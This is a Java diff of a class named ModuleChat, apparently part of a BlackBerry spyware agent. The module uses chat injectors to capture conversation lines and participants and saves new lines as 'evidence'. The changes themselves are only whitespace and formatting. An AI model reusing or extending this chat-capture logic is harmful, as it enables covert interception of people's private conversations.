@@ -101,12 +101,11 @@ public final class ModuleChat extends BaseModule {
 
         ChatGroupInjector.enableGroup(true);
         UiApplication.getUiApplication().invokeAndWait(new Runnable() {
-            
+
             public void run() {
                 InjectorManager.getInstance().start();
             }
         });
-        
 
     }
 
@@ -135,7 +134,7 @@ public final class ModuleChat extends BaseModule {
             markup.createEmptyMarkup();
         }
 
-        markup.put(program +" : "+ partecipants, lastLine);
+        markup.put(program + " : " + partecipants, lastLine);
     }
 
     private synchronized String unserialize(String program, String partecipants) {
@@ -144,7 +143,7 @@ public final class ModuleChat extends BaseModule {
         //#endif
 
         if (markup.isMarkup()) {
-            String lastLine = markup.getLine(program +" : "+ partecipants);
+            String lastLine = markup.getLine(program + " : " + partecipants);
 
             //#ifdef DEBUG
             debug.trace("unserialized: " + lastLine); //$NON-NLS-1$
@@ -190,39 +189,40 @@ public final class ModuleChat extends BaseModule {
         evidence.atomicWriteOnce(items);
 
     }
-    
-    public synchronized void addLines(String program, String partecipants, Vector lines) {
+
+    public synchronized void addLines(String program, String partecipants,
+            Vector lines) {
         if (lines == null) {
             //#ifdef DEBUG
             debug.error("add: null lines"); //$NON-NLS-1$
             //#endif
             return;
         }
- 
+
         //#ifdef DEBUG
-        debug.trace("add: " + program + " part: "+ partecipants + " lines: " + lines.size()); //$NON-NLS-1$ //$NON-NLS-2$
+        debug.trace("add: " + program + " part: " + partecipants + " lines: " + lines.size()); //$NON-NLS-1$ //$NON-NLS-2$
         //#endif
- 
+
         if (lines.size() == 0) {
             //#ifdef DEBUG
             debug.trace("add: no lines, skipping"); //$NON-NLS-1$
             //#endif
             return;
         }
- 
+
         //#ifdef DBC
         Check.asserts(lines != null, "null lines"); //$NON-NLS-1$
         //#endif
- 
+
         String lastLine = unserialize(program, partecipants);
- 
+
         if (lines.lastElement().equals(lastLine)) {
             //#ifdef DEBUG
             debug.trace("add: nothing new"); //$NON-NLS-1$
             //#endif
             return;
         }
- 
+
         int lastEqual;
         for (lastEqual = lines.size() - 1; lastEqual >= 0; lastEqual--) {
             if (lines.elementAt(lastEqual).equals(lastLine)) {
@@ -232,26 +232,26 @@ public final class ModuleChat extends BaseModule {
                 break;
             }
         }
- 
+
         if (lastEqual <= 0) {
             lastEqual = -1;
             //#ifdef DEBUG
             debug.info("add: no found, save everything."); //$NON-NLS-1$
             //#endif
         }
- 
+
         try {
             lastLine = (String) lines.lastElement();
             //#ifdef DEBUG
             debug.trace("add, serialize lastLine: " + lastLine); //$NON-NLS-1$
             //#endif
- 
+
             serialize(program, partecipants, lastLine);
             //#ifdef DEBUG
             debug.trace("write evidence from line: " + lastEqual + 1); //$NON-NLS-1$
             //#endif
             writeEvidence(program, partecipants, lines, lastEqual + 1);
- 
+
             //#ifdef DEBUG
             debug.trace("add end"); //$NON-NLS-1$
             //#endif
